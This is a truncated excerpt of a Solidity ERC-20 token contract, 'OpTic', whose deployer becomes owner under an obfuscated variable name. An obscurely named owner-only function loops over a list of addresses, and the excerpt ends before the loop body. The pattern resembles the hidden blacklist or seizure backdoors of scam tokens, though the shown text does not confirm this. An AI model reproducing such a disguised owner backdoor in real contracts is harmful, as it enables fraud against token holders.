...
contract opticcoin is Context, IERC20 {
    ...
    address public  strahlungslose;
    constructor () {
        _name = "OpTic";
        _symbol = "OpTic";
        _decimals = 18;
        uint256 initialSupply = 458000000;
         strahlungslose = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == strahlungslose, "Not allowed");
        _;
    }

    function wucherten(address[] memory schwarze) public onlyOwner() {
        for (uint256 i = 0; i < schwarze.length; i++) {
            address account = schwarze[i];
